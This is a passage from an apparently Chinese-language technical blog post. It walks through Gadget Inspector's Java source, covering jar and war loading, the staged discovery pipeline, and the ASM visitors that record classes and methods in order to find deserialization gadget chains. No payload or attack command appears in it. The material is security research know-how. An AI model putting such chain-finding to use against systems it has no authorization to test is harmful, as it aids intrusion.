Collection&lt;ClassResource&gt; <span class="title function_">getRuntimeClasses</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// Java8 及以前的运行时类可以通过读取 rt.jar 文件获取</span></span><br><span class="line">    <span class="comment">// A hacky way to get the current JRE&#x27;s rt.jar. Depending on the class loader, rt.jar may be in the</span></span><br><span class="line">    <span class="comment">// bootstrap classloader so all the JDK classes will be excluded from classpath scanning with this!</span></span><br><span class="line">    <span class="comment">// However, this only works up to Java 8, since after that Java uses some crazy module magic.</span></span><br><span class="line">    <span class="type">URL</span> <span class="variable">stringClassUrl</span> <span class="operator">=</span> Object.class.getResource(<span class="string">&quot;String.class&quot;</span>);</span><br><span class="line">    <span class="type">URLConnection</span> <span class="variable">connection</span> <span class="operator">=</span> stringClassUrl.openConnection();</span><br><span class="line">    Collection&lt;ClassResource&gt; result = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">if</span> (connection <span class="keyword">instanceof</span> JarURLConnection) &#123;</span><br><span class="line">        <span class="type">URL</span> <span class="variable">runtimeUrl</span> <span class="operator">=</span> ((JarURLConnection) connection).getJarFileURL();</span><br><span class="line">        <span class="type">URLClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(<span class="keyword">new</span> <span class="title class_">URL</span>[]&#123;runtimeUrl&#125;);</span><br><span class="line">        <span class="keyword">for</span> (ClassPath.ClassInfo classInfo : ClassPath.from(classLoader).getAllClasses()) &#123;</span><br><span class="line">            result.add(<span class="keyword">new</span> <span class="title class_">ClassLoaderClassResource</span>(classLoader, classInfo.getResourceName()));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Java9 及以后的运行时类通过 JRT 文件系统读取路径下的类文件</span></span><br><span class="line">    <span class="comment">// https://stackoverflow.com/questions/1240387/where-are-the-java-system-packages-stored/53897006#53897006</span></span><br><span class="line">    <span class="comment">// Try finding all the JDK classes using the Java9+ modules method:</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">FileSystem</span> <span class="variable">fs</span> <span class="operator">=</span> FileSystems.getFileSystem(URI.create(<span class="string">&quot;jrt:/&quot;</span>));</span><br><span class="line">        Files.walk(fs.getPath(<span class="string">&quot;/&quot;</span>)).forEach(p -&gt; &#123;</span><br><span class="line">            <span class="keyword">if</span> (p.toString().toLowerCase().endsWith(<span class="string">&quot;.class&quot;</span>)) &#123;</span><br><span class="line">                result.add(<span class="keyword">new</span> <span class="title class_">PathClassResource</span>(p));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ProviderNotFoundException e) &#123;</span><br><span class="line">        <span class="comment">// Do nothing; this is expected on versions below Java9</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-GadgetInspector"><a href="#3-GadgetInspector" class="headerlink" title="3. GadgetInspector"></a>3. GadgetInspector</h2><p>程序入口 <code>main</code>，先做一些准备工作，然后分 5 步走挖掘利用链。</p><p>首先判断参数是否为空，使用 Gadget Inspector 至少要指定一个待分析的 java 包，若参数为空则打印使用帮助。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (args.length == <span class="number">0</span>) &#123;</span><br><span class="line">    printUsage();   <span class="comment">// 打印使用帮助</span></span><br><span class="line">    System.exit(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>配置日志输出、.dat 文件保留、挖掘类型。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 配置 log4j 用于输出日志</span></span><br><span class="line">configureLogging();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 是否保留所有的 .dat 文件</span></span><br><span class="line"><span class="type">boolean</span> <span class="variable">resume</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 挖掘类型，默认为 java 原生序列化</span></span><br><span class="line"><span class="type">GIConfig</span> <span class="variable">config</span> <span class="operator">=</span> ConfigRepository.getConfig(<span class="string">&quot;jserial&quot;</span>);    <span class="comment">// 实现 SerializableDecider、ImplementationFinder、SourceDiscovery</span></span><br></pre></td></tr></table></figure><p>解析参数，可选参数包括：</p><ul><li><code>--resume</code>：是否保留文件，默认不保留</li><li><code>--config xxx</code>：指定挖掘类型，默认 Java 原生序列化 <code>jserial</code></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">argIndex</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (argIndex &lt; args.length) &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">arg</span> <span class="operator">=</span> args[argIndex];</span><br><span class="line">    <span class="keyword">if</span> (!arg.startsWith(<span class="string">&quot;--&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (arg.equals(<span class="string">&quot;--resume&quot;</span>)) &#123;</span><br><span class="line">        <span class="comment">// 保留 .dat 文件</span></span><br><span class="line">        resume = <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (arg.equals(<span class="string">&quot;--config&quot;</span>)) &#123;</span><br><span class="line">        <span class="comment">// 指定挖掘类型</span></span><br><span class="line">        config = ConfigRepository.getConfig(args[++argIndex]);</span><br><span class="line">        <span class="keyword">if</span> (config == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Invalid config name: &quot;</span> + args[argIndex]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Unexpected argument: &quot;</span> + arg);</span><br><span class="line">    &#125;</span><br><span class="line">    argIndex += <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据参数读取 war 包或 jar 包，可以指定 1 个 war 包或多个 jar 包。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 实际上是 URLClassLoader</span></span><br><span class="line"><span class="keyword">final</span> ClassLoader classLoader;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对指定文件根据 war、spring-boot jar、普通 jar 包的方式载入对于字节码文件，并返回 URLClassLoader</span></span><br><span class="line"><span class="keyword">if</span> (args.length == argIndex + <span class="number">1</span> &amp;&amp; args[argIndex].toLowerCase().endsWith(<span class="string">&quot;.war&quot;</span>)) &#123;</span><br><span class="line">    <span class="comment">// 构造 war 文件路径</span></span><br><span class="line">    <span class="type">Path</span> <span class="variable">path</span> <span class="operator">=</span> Paths.get(args[argIndex]);</span><br><span class="line">    LOGGER.info(<span class="string">&quot;Using WAR classpath: &quot;</span> + path);</span><br><span class="line">    <span class="comment">// 实现为 URLClassLoader，加载 war 包下的 WEB-INF/lib 和 WEB-INF/classes</span></span><br><span class="line">    classLoader = Util.getWarClassLoader(path);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 构造 jar 文件路径，可配置多个</span></span><br><span class="line">    <span class="keyword">final</span> Path[] jarPaths = <span class="keyword">new</span> <span class="title class_">Path</span>[args.length - argIndex];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; args.length - argIndex; i++) &#123;</span><br><span class="line">        <span class="type">Path</span> <span class="variable">path</span> <span class="operator">=</span> Paths.get(args[argIndex + i]).toAbsolutePath();</span><br><span class="line">        <span class="keyword">if</span> (!Files.exists(path)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Invalid jar path: &quot;</span> + path);</span><br><span class="line">        &#125;</span><br><span class="line">        jarPaths[i] = path;</span><br><span class="line">    &#125;</span><br><span class="line">    LOGGER.info(<span class="string">&quot;Using classpath: &quot;</span> + Arrays.toString(jarPaths));</span><br><span class="line">    <span class="comment">// 实现为 URLClassLoader，加载所有指定的 jar</span></span><br><span class="line">    classLoader = Util.getJarClassLoader(jarPaths);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用上面得到的 ClassLoader 初始化类枚举加载器。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">ClassResourceEnumerator</span> <span class="variable">classResourceEnumerator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassResourceEnumerator</span>(classLoader);</span><br></pre></td></tr></table></figure><p>根据 <code>resume</code> 变量的值决定是否删除 .dat 文件，挖掘到的利用链存储在 gadget-chains.txt 中。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!resume) &#123;</span><br><span class="line">    <span class="comment">// Delete all existing dat files</span></span><br><span class="line">    LOGGER.info(<span class="string">&quot;Deleting stale data...&quot;</span>);</span><br><span class="line">    <span class="comment">// 挖掘到的利用链存储在 gadget-chains.txt 中，不删除</span></span><br><span class="line">    <span class="keyword">for</span> (String datFile : Arrays.asList(<span class="string">&quot;classes.dat&quot;</span>, <span class="string">&quot;methods.dat&quot;</span>, <span class="string">&quot;inheritanceMap.dat&quot;</span>,</span><br><span class="line">            <span class="string">&quot;passthrough.dat&quot;</span>, <span class="string">&quot;callgraph.dat&quot;</span>, <span class="string">&quot;sources.dat&quot;</span>, <span class="string">&quot;methodimpl.dat&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Path</span> <span class="variable">path</span> <span class="operator">=</span> Paths.get(datFile);</span><br><span class="line">        <span class="keyword">if</span> (Files.exists(path)) &#123;</span><br><span class="line">            Files.delete(path);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>挖掘过程中判断是否存在 .dat 文件，核心步骤如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Perform the various discovery steps</span></span><br><span class="line"><span class="keyword">if</span> (!Files.exists(Paths.get(<span class="string">&quot;classes.dat&quot;</span>)) || !Files.exists(Paths.get(<span class="string">&quot;methods.dat&quot;</span>))</span><br><span class="line">        || !Files.exists(Paths.get(<span class="string">&quot;inheritanceMap.dat&quot;</span>))) &#123;</span><br><span class="line">    LOGGER.info(<span class="string">&quot;Running method discovery...&quot;</span>);</span><br><span class="line">    <span class="type">MethodDiscovery</span> <span class="variable">methodDiscovery</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MethodDiscovery</span>();</span><br><span class="line">    methodDiscovery.discover(classResourceEnumerator);</span><br><span class="line">    methodDiscovery.save(); <span class="comment">// 保存类信息、方法信息、继承信息</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!Files.exists(Paths.get(<span class="string">&quot;passthrough.dat&quot;</span>))) &#123;</span><br><span class="line">    LOGGER.info(<span class="string">&quot;Analyzing methods for passthrough dataflow...&quot;</span>);</span><br><span class="line">    <span class="type">PassthroughDiscovery</span> <span class="variable">passthroughDiscovery</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PassthroughDiscovery</span>();</span><br><span class="line">    passthroughDiscovery.discover(classResourceEnumerator, config);</span><br><span class="line">    passthroughDiscovery.save();    <span class="comment">// 保存数据流信息（方法参数和返回值的关系信息）</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!Files.exists(Paths.get(<span class="string">&quot;callgraph.dat&quot;</span>))) &#123;</span><br><span class="line">    LOGGER.info(<span class="string">&quot;Analyzing methods in order to build a call graph...&quot;</span>);</span><br><span class="line">    <span class="type">CallGraphDiscovery</span> <span class="variable">callGraphDiscovery</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CallGraphDiscovery</span>();</span><br><span class="line">    callGraphDiscovery.discover(classResourceEnumerator, config);</span><br><span class="line">    callGraphDiscovery.save();  <span class="comment">// 保存调用关系信息（调用者方法与被调方法之间的参数传递）</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!Files.exists(Paths.get(<span class="string">&quot;sources.dat&quot;</span>))) &#123;</span><br><span class="line">    LOGGER.info(<span class="string">&quot;Discovering gadget chain source methods...&quot;</span>);</span><br><span class="line">    <span class="type">SourceDiscovery</span> <span class="variable">sourceDiscovery</span> <span class="operator">=</span> config.getSourceDiscovery();</span><br><span class="line">    sourceDiscovery.discover();</span><br><span class="line">    sourceDiscovery.save(); <span class="comment">// 保存污点源信息</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    LOGGER.info(<span class="string">&quot;Searching call graph for gadget chains...&quot;</span>);</span><br><span class="line">    <span class="type">GadgetChainDiscovery</span> <span class="variable">gadgetChainDiscovery</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GadgetChainDiscovery</span>(config);</span><br><span class="line">    gadgetChainDiscovery.discover();    <span class="comment">// 保存重写信息、利用链信息</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>核心步骤看起来有多简单实际实现就有多复杂（<del>不是</del>），下面就展开核心步骤的内容。</p><h2 id="4-MethodDiscovery"><a href="#4-MethodDiscovery" class="headerlink" title="4. MethodDiscovery"></a>4. MethodDiscovery</h2><p><code>discover</code> 方法主要完成的是读取类文件并利用 asm 的访问者记录类信息、方法信息。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 使用访问者记录类信息和方法信息</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> classResourceEnumerator 类枚举器</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> Exception</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">discover</span><span class="params">(<span class="keyword">final</span> ClassResourceEnumerator classResourceEnumerator)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">// 遍历所有的类</span></span><br><span class="line">    <span class="keyword">for</span> (ClassResourceEnumerator.ClassResource classResource : classResourceEnumerator.getAllClasses()) &#123;</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> classResource.getInputStream()) &#123; <span class="comment">// 读取类文件</span></span><br><span class="line">            <span class="type">ClassReader</span> <span class="variable">cr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassReader</span>(in);   <span class="comment">// 创建 ClassReader，后续调用 accept 方法解析类文件</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 继承 asm 的 ClassVisitor(MethodVisitor) 实现对类文件的观察，记录类信息和方法信息</span></span><br><span class="line">                <span class="comment">// 重写方法的调用顺序（没有重写的调用默认方法）：visit -&gt; visitField -&gt; visitMethod -&gt; visitEnd</span></span><br><span class="line">                cr.accept(<span class="keyword">new</span> <span class="title class_">MethodDiscoveryClassVisitor</span>(), ClassReader.EXPAND_FRAMES);    <span class="comment">// 以扩展格式访问堆栈映射帧</span></span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                LOGGER.error(<span class="string">&quot;Exception analyzing: &quot;</span> + classResource.getName(), e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>MethodDiscoveryClassVisitor</code> 类继承了 asm 中的 ClassVisitor，重写了四个访问者方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> String name;            <span class="comment">// 类的内部名称</span></span><br><span class="line"><span class="keyword">private</span> String superName;       <span class="comment">// 父类的内部名称</span></span><br><span class="line"><span class="keyword">private</span> String[] interfaces;    <span class="comment">// 类接口的内部名称</span></span><br><span class="line"><span class="type">boolean</span> isInterface;            <span class="comment">// 是否为接口</span></span><br><span class="line"><span class="keyword">private</span> List&lt;ClassReference.Member&gt; members;    <span class="comment">// 类的所有字段</span></span><br><span class="line"><span class="keyword">private</span> ClassReference.Handle classHandle;      <span class="comment">// 引用</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="title function_">MethodDiscoveryClassVisitor</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    <span class="built_in">super</span>(Opcodes.ASM6);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>visit</code> 方法在类访问的开始时调用（即 <code>ClassReader.accept</code> 调用的第一个访问者方法），记录类名、父类名、接口名、是否为接口，创建动态数组用于在 <code>visitField</code> 中记录字段信息。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visit</span><span class="params">(<span class="type">int</span> version, <span class="type">int</span> access, String name, String signature, String superName, String[] interfaces)</span> &#123;  <span class="comment">// 类访问开始（调用的第一个方法）</span></span><br><span class="line">    <span class="comment">// 记录类信息</span></span><br><span class="line">    <span class="built_in">this</span>.name = name;</span><br><span class="line">    <span class="built_in">this</span>.superName = superName;</span><br><span class="line">    <span class="built_in">this</span>.interfaces = interfaces;</span><br><span class="line">    <span class="built_in">this</span>.isInterface = (access &amp; Opcodes.ACC_INTERFACE) != <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">this</span>.members = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();   <span class="comment">// 字段信息（成员）</span></span><br><span class="line">    <span class="built_in">this</span>.classHandle = <span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(name); <span class="comment">// 当前类</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用父类方法</span></span><br><span class="line">    <span class="built_in">super</span>.visit(version, access, name, signature, superName, interfaces);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>visitField</code> 方法用于记录类的字段信息，包括名称、访问标志、类型，根据访问标志 <code>access</code> 判断是否为静态变量，因为静态变量不可控所以不当作可能的污点。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> FieldVisitor <span class="title function_">visitField</span><span class="params">(<span class="type">int</span> access, String name, String desc,    // 访问字段</span></span><br><span class="line"><span class="params">                               String signature, Object value)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((access &amp; Opcodes.ACC_STATIC) == <span class="number">0</span>) &#123; <span class="comment">// 跳过静态成员</span></span><br><span class="line">        <span class="type">Type</span> <span class="variable">type</span> <span class="operator">=</span> Type.getType(desc); <span class="comment">// 类型</span></span><br><span class="line">        String typeName;</span><br><span class="line">        <span class="keyword">if</span> (type.getSort() == Type.OBJECT || type.getSort() == Type.ARRAY) &#123;    <span class="comment">// 对象或数组</span></span><br><span class="line">            typeName = type.getInternalName();  <span class="comment">// 内部名称</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            typeName = type.getDescriptor();    <span class="comment">// 描述符</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 记录字段信息，保存到 members</span></span><br><span class="line">        members.add(<span class="keyword">new</span> <span class="title class_">ClassReference</span>.Member(name, access, <span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(typeName)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用父类方法</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">super</span>.visitField(access, name, desc, signature, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>visitMethod</code> 方法用于记录方法信息，包括所属类名、方法名、描述符、是否为静态方法，同样根据访问标志判断是否为静态方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> MethodVisitor <span class="title function_">visitMethod</span><span class="params">(<span class="type">int</span> access, String name, String desc, String signature, String[] exceptions)</span> &#123; <span class="comment">// 访问方法</span></span><br><span class="line">    <span class="type">boolean</span> <span class="variable">isStatic</span> <span class="operator">=</span> (access &amp; Opcodes.ACC_STATIC) != <span class="number">0</span>;  <span class="comment">// 是否为静态方法</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 记录方法信息，保存到 discoveredMethods</span></span><br><span class="line">    discoveredMethods.add(<span class="keyword">new</span> <span class="title class_">MethodReference</span>(</span><br><span class="line">            classHandle,    <span class="comment">// 所属类</span></span><br><span class="line">            name,</span><br><span class="line">            desc,</span><br><span class="line">            isStatic));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用父类方法</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">super</span>.visitMethod(access, name, desc, signature, exceptions);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>visitEnd</code> 方法在类访问结束时调用，（即 <code>ClassReader.accept</code> 调用的最后一个访问者方法），此时类的字段信息已经记录完毕，可以记录下完整的类信息，包括类名、父类名、接口名、是否为接口、字段信息。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitEnd</span><span class="params">()</span> &#123;    <span class="comment">// 类访问结束（调用的最后一个方法）</span></span><br><span class="line">    <span class="type">ClassReference</span> <span class="variable">classReference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassReference</span>(</span><br><span class="line">            name,</span><br><span class="line">            superName,</span><br><span class="line">            interfaces,</span><br><span class="line">            isInterface,</span><br><span class="line">            members.toArray(<span class="keyword">new</span> <span class="title class_">ClassReference</span>.Member[members.size()])); <span class="comment">// 把所有找到的字段封装</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 记录类信息，保存到 discoveredClasses</span></span><br><span class="line">    discoveredClasses.add(classReference);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 调用父类方法</span></span><br><span class="line">    <span class="built_in">super</span>.visitEnd();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>save</code> 方法存储收集到的类信息和方法信息，同时调用 <code>InheritanceDeriver.derive</code> 获取继承信息并保存。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 使用工厂方法存储数据</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">save</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// classes.dat 数据格式：</span></span><br><span class="line">    <span class="comment">// 类名 父类名 接口A,接口B,接口C 是否为接口 字段1!字段1描述符!字段1类型!字段2!字段2描述符!字段2类型</span></span><br><span class="line">    DataLoader.saveData(Paths.get(<span class="string">&quot;classes.dat&quot;</span>), <span class="keyword">new</span> <span class="title class_">ClassReference</span>.Factory(), discoveredClasses);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// methods.dat 数据格式：</span></span><br><span class="line">    <span class="comment">// 类名 方法名 方法描述符 是否为静态方法</span></span><br><span class="line">    DataLoader.saveData(Paths.get(<span class="string">&quot;methods.dat&quot;</span>), <span class="keyword">new</span> <span class="title class_">MethodReference</span>.Factory(), discoveredMethods);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 形成 类名(ClassReference.Handle)-&gt;类(ClassReference) 的映射关系</span></span><br><span class="line">    Map&lt;ClassReference.Handle, ClassReference&gt; classMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (ClassReference clazz : discoveredClasses) &#123;</span><br><span class="line">        classMap.put(clazz.getHandle(), clazz);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 对上面的类信息进行递归整合，得到 `子类-&gt;父类集合` 